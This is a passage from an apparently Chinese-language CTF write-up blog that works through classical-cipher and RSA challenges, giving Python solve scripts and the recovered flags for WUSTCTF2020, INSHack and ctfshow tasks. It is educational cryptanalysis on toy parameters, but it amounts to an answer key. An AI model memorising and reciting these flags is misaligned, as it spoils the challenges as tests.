class="string">&#x27;萃&#x27;</span>, <span class="string">&#x27;否&#x27;</span>, <span class="string">&#x27;谦&#x27;</span>, <span class="string">&#x27;艮&#x27;</span>, <span class="string">&#x27;蹇&#x27;</span>, <span class="string">&#x27;渐&#x27;</span>, <span class="string">&#x27;小过&#x27;</span>, <span class="string">&#x27;旅&#x27;</span>, <span class="string">&#x27;咸&#x27;</span>, <span class="string">&#x27;遁&#x27;</span>, <span class="string">&#x27;师&#x27;</span>, <span class="string">&#x27;蒙&#x27;</span>, <span class="string">&#x27;坎&#x27;</span>, <span class="string">&#x27;涣&#x27;</span>, <span class="string">&#x27;解&#x27;</span>, <span class="string">&#x27;未济&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;困&#x27;</span>, <span class="string">&#x27;讼&#x27;</span>, <span class="string">&#x27;升&#x27;</span>, <span class="string">&#x27;蛊&#x27;</span>, <span class="string">&#x27;井&#x27;</span>, <span class="string">&#x27;巽&#x27;</span>, <span class="string">&#x27;恒&#x27;</span>, <span class="string">&#x27;鼎&#x27;</span>, <span class="string">&#x27;大过&#x27;</span>, <span class="string">&#x27;姤&#x27;</span>, <span class="string">&#x27;复&#x27;</span>, <span class="string">&#x27;颐&#x27;</span>, <span class="string">&#x27;屯&#x27;</span>, <span class="string">&#x27;益&#x27;</span>, <span class="string">&#x27;震&#x27;</span>, <span class="string">&#x27;噬嗑&#x27;</span>, <span class="string">&#x27;随&#x27;</span>, <span class="string">&#x27;无妄&#x27;</span>, <span class="string">&#x27;明夷&#x27;</span>, <span class="string">&#x27;贲&#x27;</span>, <span class="string">&#x27;既济&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;家人&#x27;</span>, <span class="string">&#x27;丰&#x27;</span>, <span class="string">&#x27;离&#x27;</span>, <span class="string">&#x27;革&#x27;</span>, <span class="string">&#x27;同人&#x27;</span>, <span class="string">&#x27;临&#x27;</span>, <span class="string">&#x27;损&#x27;</span>, <span class="string">&#x27;节&#x27;</span>, <span class="string">&#x27;中孚&#x27;</span>, <span class="string">&#x27;归妹&#x27;</span>, <span class="string">&#x27;睽&#x27;</span>, <span class="string">&#x27;兑&#x27;</span>, <span class="string">&#x27;履&#x27;</span>, <span class="string">&#x27;泰&#x27;</span>, <span class="string">&#x27;大畜&#x27;</span>, <span class="string">&#x27;需&#x27;</span>, <span class="string">&#x27;小畜&#x27;</span>, <span class="string">&#x27;大壮&#x27;</span>, <span class="string">&#x27;大有&#x27;</span>, <span class="string">&#x27;夬&#x27;</span>, <span class="string">&#x27;乾&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>():</span><br><span class="line">    <span class="keyword">global</span> mingwen</span><br><span class="line">    mingwen = enc</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> keys:</span><br><span class="line">        mingwen = mingwen.replace(each, mydisc[each])</span><br><span class="line">    mingwen = long_to_bytes(<span class="built_in">int</span>(mingwen, <span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(mingwen)</span><br><span class="line">    <span class="built_in">print</span>(base64.b64decode(mingwen))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrypt1()  <span class="comment"># n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP</span></span><br><span class="line">temp = <span class="string">&quot;n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def encrpyt5():</span></span><br><span class="line"><span class="string">    enc = &#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in flag:</span></span><br><span class="line"><span class="string">        enc += chr((a * (ord(i) - 97) + b) % 26 + 97)</span></span><br><span class="line"><span class="string">    return (enc)</span></span><br><span class="line"><span class="string">def encrypt4():</span></span><br><span class="line"><span class="string">    temp = &#x27;&#x27;</span></span><br><span class="line"><span class="string">    offset = 5</span></span><br><span class="line"><span class="string">    for i in range(len(enc)):</span></span><br><span class="line"><span class="string">        temp += chr(ord(enc[i]) - offset - i)</span></span><br><span class="line"><span class="string">    return (temp)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypto4</span>():</span><br><span class="line">    enc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    offset = <span class="number">5</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(temp)):</span><br><span class="line">        enc += <span class="built_in">chr</span>(<span class="built_in">ord</span>(temp[i]) + offset + i)</span><br><span class="line">    <span class="built_in">print</span>(enc)</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">letter = string.ascii_lowercase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypto5</span>(<span class="params">enc</span>):</span><br><span class="line">    <span class="comment"># 没给b的仿射密码，爆破b</span></span><br><span class="line">    aa = <span class="number">1</span></span><br><span class="line">    b = <span class="number">7</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            aa = gmpy2.invert(a, <span class="number">26</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">            flag += letter[(aa * (letter.index(enc[i]) - b)) % <span class="number">26</span>]</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">enc = decrypto4()</span><br><span class="line">decrypto5(enc)</span><br><span class="line"><span class="comment"># bjdcongratulationsongettingtheflag</span></span><br></pre></td></tr></table></figure><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><h3 id="各种参数的求取"><a href="#各种参数的求取" class="headerlink" title="各种参数的求取"></a>各种参数的求取</h3><h4 id="有e-d和n如何求出phi"><a href="#有e-d和n如何求出phi" class="headerlink" title="有e*d和n如何求出phi"></a>有<code>e*d</code>和<code>n</code>如何求出<code>phi</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">K=((e*d-<span class="number">1</span>) // n) + <span class="number">1</span></span><br><span class="line">phi=(e*d-<span class="number">1</span>)//K</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phi=(e*d-<span class="number">1</span>)//(((e*d-<span class="number">1</span>)//n)+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="有phi和n如何分解n"><a href="#有phi和n如何分解n" class="headerlink" title="有phi和n如何分解n"></a>有<code>phi</code>和<code>n</code>如何分解<code>n</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve_p</span>(<span class="params">n, phi</span>):</span><br><span class="line">    tmp1 = n - phi + <span class="number">1</span>  <span class="comment"># =p+q</span></span><br><span class="line">    tmp2 = gmpy2.isqrt(<span class="built_in">pow</span>(tmp1, <span class="number">2</span>) - <span class="number">4</span> * P_n) <span class="comment"># =p-q</span></span><br><span class="line">    p = (tmp1 + tmp2) // <span class="number">2</span></span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br></pre></td></tr></table></figure><h4 id="中国剩余定理求通解"><a href="#中国剩余定理求通解" class="headerlink" title="中国剩余定理求通解"></a>中国剩余定理求通解</h4><p>这个就是有几个参数求X的那个，几个式子最后可以求得未知量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">def merge(a1, n1, a2, n2):</span><br><span class="line">    d = gmpy2.gcd(n1, n2)</span><br><span class="line">    c = a2 - a1</span><br><span class="line">    if c % d != 0:</span><br><span class="line">        return 0</span><br><span class="line">    c = (c % n2 + n2) % n2</span><br><span class="line">    c = c // d</span><br><span class="line">    n1 = n1 // d</span><br><span class="line">    n2 = n2 // d</span><br><span class="line">    c *= gmpy2.invert(n1, n2)</span><br><span class="line">    c %= n2</span><br><span class="line">    c *= n1 * d</span><br><span class="line">    c += a1</span><br><span class="line">    global n3</span><br><span class="line">    global a3</span><br><span class="line">    n3 = n1 * n2 * d</span><br><span class="line">    a3 = (c % n3 + n3) % n3</span><br><span class="line">    return 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exCRT(a, n):</span><br><span class="line">    a1 = a[0]</span><br><span class="line">    n1 = n[0]</span><br><span class="line">    le = len(a)</span><br><span class="line">    for i in range(1, le):</span><br><span class="line">        a2 = a[i]</span><br><span class="line">        n2 = n[i]</span><br><span class="line">        if not merge(a1, n1, a2, n2):</span><br><span class="line">            return -1</span><br><span class="line">        a1 = a3</span><br><span class="line">        n1 = n3</span><br><span class="line">    global mod</span><br><span class="line">    mod = n1</span><br><span class="line">    return (a1 % n1 + n1) % n1</span><br></pre></td></tr></table></figure><p>使用时将a、n两个list带入即可。适合的情况为：<br>$$<br>m ^ e ≡ c \quad mod \quad n<br>$$<br>此时的话，欲求这个<code>m^e</code>，只需有几组对应的<code>c</code>和<code>n</code>的数据即可带入上方的<code>exCRT(a,n)</code>来求。</p><h4 id="小e值时的碰撞脚本"><a href="#小e值时的碰撞脚本" class="headerlink" title="小e值时的碰撞脚本"></a>小e值时的碰撞脚本</h4><blockquote><p>RSA不免遇到这种情况，当碰到小e的时候，下面的碰撞脚本也许能派上用场</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rune</span>(<span class="params">e,n,c</span>):</span><br><span class="line">    k=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x=c+k*n</span><br><span class="line">        <span class="keyword">if</span> gmpy2.iroot(x,e)[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> gmpy2.iroot(x,e)[<span class="number">0</span>]</span><br><span class="line">        k=k+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>其实这个脚本适用的也是下面的这个公式的情况，只不过对于这个e很小的这种情况是直接可以求出这个m，也就是明文信息的。<br>$$<br>m ^ e ≡ c \quad mod \quad n<br>$$</p><h3 id="使用rsa的方式"><a href="#使用rsa的方式" class="headerlink" title="使用rsa的方式"></a>使用rsa的方式</h3><h4 id="WUSTCTF2020-情书"><a href="#WUSTCTF2020-情书" class="headerlink" title="[WUSTCTF2020]情书"></a>[WUSTCTF2020]情书</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Premise: Enumerate the alphabet by 0、1、2、.....  、25</span><br><span class="line">Using the RSA system </span><br><span class="line">Encryption:0156 0821 1616 0041 0140 2130 1616 0793</span><br><span class="line">Public Key:2537 and 13</span><br><span class="line">Private Key:2537 and 937</span><br><span class="line"></span><br><span class="line">flag: wctf2020&#123;Decryption&#125;</span><br></pre></td></tr></table></figure><p>这个题目根据提示采用的是rsa的加密系统，这里翻译一下就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=2537</span><br><span class="line">e=13</span><br><span class="line">d=937</span><br></pre></td></tr></table></figure><p>大概就像是这样进行解密的</p><p><img src="/2021/05/28/CTF//image-20210726202807984.png"></p><p>写出一个简单的脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ciphertext = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="string">&#x27;0156 0821 1616 0041 0140 2130 1616 0793&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line">n=<span class="number">2537</span></span><br><span class="line">d=<span class="number">937</span></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ciphertext:</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    plaintext += <span class="built_in">chr</span>(<span class="number">97</span> + m)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment"># iloveyou</span></span><br></pre></td></tr></table></figure><h4 id="INSHack2017-rsa16m"><a href="#INSHack2017-rsa16m" class="headerlink" title="[INSHack2017]rsa16m"></a>[INSHack2017]rsa16m</h4><p><strong>TAG: n、c超级大，e正常</strong></p><p>这个题给出的两个参数超级大，怎么形容呢？我打开文件用了几十秒。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rsa_16m.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line">    c = <span class="built_in">str</span>(data[<span class="number">1</span>])[<span class="number">6</span>:<span class="built_in">len</span>(<span class="built_in">str</span>(data[<span class="number">1</span>])) - <span class="number">3</span>]</span><br><span class="line">    c = <span class="built_in">int</span>(c, <span class="number">16</span>)</span><br><span class="line">    e = <span class="built_in">str</span>(data[<span class="number">2</span>])[<span class="number">6</span>:<span class="built_in">len</span>(<span class="built_in">str</span>(data[<span class="number">2</span>]))-<span class="number">1</span>]</span><br><span class="line">    e = <span class="built_in">int</span>(e, <span class="number">16</span>)</span><br><span class="line">    m = gmpy2.iroot(c, e)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    flag = m[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(mpz(30156321943599743278455918182580886589695285093075236154009535613), True)</span></span><br><span class="line"><span class="string">b&#x27;INSA&#123;(I)NSA_W0uld_bE_pr0uD&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这个m远小于n的情况下直接对c求e的次方根就有可能可以解出来这个m。</p><h4 id="INSHack2019-Yet-Another-RSA-Challenge-Part-1"><a href="#INSHack2019-Yet-Another-RSA-Challenge-Part-1" class="headerlink" title="[INSHack2019]Yet Another RSA Challenge - Part 1"></a>[INSHack2019]Yet Another RSA Challenge - Part 1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import subprocess</span></span><br><span class="line"><span class="string">p = subprocess.check_output(&#x27;openssl prime -generate -bits 2048 -hex&#x27;)</span></span><br><span class="line"><span class="string">q = subprocess.check_output(&#x27;openssl prime -generate -bits 2048 -hex&#x27;)</span></span><br><span class="line"><span class="string">flag = int(&#x27;INSA&#123;REDACTED&#125;&#x27;.encode(&#x27;hex&#x27;), 16)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">N = int(p,16) * int(q,16)</span></span><br><span class="line"><span class="string">print N</span></span><br><span class="line"><span class="string">print &#x27;0x&#x27;+p.replace(&#x27;9F&#x27;,&#x27;FC&#x27;)</span></span><br><span class="line"><span class="string">print pow(flag,65537,N)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># FC可能是9F，也可能是FC，爆破</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(data[<span class="number">0</span>])</span><br><span class="line">c = <span class="built_in">int</span>(data[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">p = data[<span class="number">1</span>]</span><br><span class="line">np = p.split(<span class="string">&#x27;FC&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(np))  <span class="comment"># 共4个FC</span></span><br><span class="line">dic = [<span class="string">&#x27;FC&#x27;</span>, <span class="string">&#x27;9F&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getp</span>():</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                    p = np[<span class="number">0</span>] + a + np[<span class="number">1</span>] + b + np[<span class="number">2</span>] + c + np[<span class="number">3</span>] + d + np[<span class="number">4</span>]</span><br><span class="line">                    p = <span class="built_in">int</span>(p, <span class="number">16</span>)</span><br><span class="line">                    q = n // p</span><br><span class="line">                    <span class="keyword">if</span> n == p * q:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;I have got p:<span class="subst">&#123;p&#125;</span>、q:<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = getp()</span><br><span class="line">d = gmpy2.invert(<span class="number">0x10001</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;INSA&#123;I_w1ll_us3_OTp_n3xT_T1M3&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>部分替换，爆破一下即可得到p。ps：用在线的也行，但是考虑到线下没网，所以尽量使用脚本。</p><h3 id="一般rsa"><a href="#一般rsa" class="headerlink" title="一般rsa"></a>一般rsa</h3><h4 id="buu、rsa"><a href="#buu、rsa" class="headerlink" title="buu、rsa"></a>buu、rsa</h4><p>题目描述：ras是一个非常神秘的算法，那么它神秘在哪里 请少侠自己摸索！ 注意：得到的 flag 请包上 flag{} 提交</p><p>文件给出的是</p><p><img src="/2021/05/28/CTF//image-20210531094155238.png" alt="这两个文件"></p><p>？？？发生什么事了，这不是密码学的前几天做过的那个啥啥啥嘛。</p><p><a href="http://tool.chacuo.net/cryptrsakeyparse">在线rsa公钥文件分解</a></p><p><a href="https://www.ssleye.com/pub_asysi.html">在线rsa公钥文件分解2（n分解为十进制）</a></p><p>直接把pub.key文件内的内容复制到上面的网站内分解一下p、q、n。</p><p><img src="/2021/05/28/CTF//image-20210531094620593.png" alt="获得模数与指数"></p><p>再在线分解一下大整数n得下面的一些数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 86934482296048119190666062003494800588905656017203025617216654058378322103517</span><br><span class="line">p = 285960468890451637935629440372639283459</span><br><span class="line">q = 304008741604601924494328155975272418463</span><br></pre></td></tr></table></figure><p>写下面得python脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line"></span><br><span class="line">key = rsa.PrivateKey(n, e, d, p, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> encflag:</span><br><span class="line">    flag = rsa.decrypt(encflag.read(), key)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;decrypt_256&#125;\n&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="ctfshow、crypto4"><a href="#ctfshow、crypto4" class="headerlink" title="ctfshow、crypto4"></a>ctfshow、crypto4</h4><p><strong>TAG: 简单求d</strong></p><p>给出条件如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p=447685307</span><br><span class="line">q=2037</span><br><span class="line">e=17</span><br><span class="line"></span><br><span class="line">求d</span><br></pre></td></tr></table></figure><p>写简单脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p=<span class="number">447685307</span></span><br><span class="line">q=<span class="number">2037</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># 53616899001</span></span><br></pre></td></tr></table></figure><h4 id="ctfshow、crypto4-1"><a href="#ctfshow、crypto4-1" class="headerlink" title="ctfshow、crypto4"></a>ctfshow、crypto4</h4><p><strong>TAG: 简单求m</strong></p><p>给出条件如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p=447685307</span><br><span class="line">q=2037</span><br><span class="line">e=17</span><br><span class="line">c=704796792</span><br></pre></td></tr></table></figure><p>继续把上面的脚本完善一下就ok了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p=<span class="number">447685307</span></span><br><span class="line">q=<span class="number">2037</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># 53616899001</span></span><br><span class="line">c=<span class="number">704796792</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 904332399012</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># 看来m并不是任何有意义的信息</span></span><br></pre></td></tr></table></figure><h4 id="ctfshow、babyrsa"><a href="#ctfshow、babyrsa" class="headerlink" title="ctfshow、babyrsa"></a>ctfshow、babyrsa</h4><p><strong>TAG: 有p、q、e、c</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">p = 104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179</span><br><span class="line">q = 140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501</span><br><span class="line">c = 4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194</span><br></pre></td></tr></table></figure><p>直接解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span 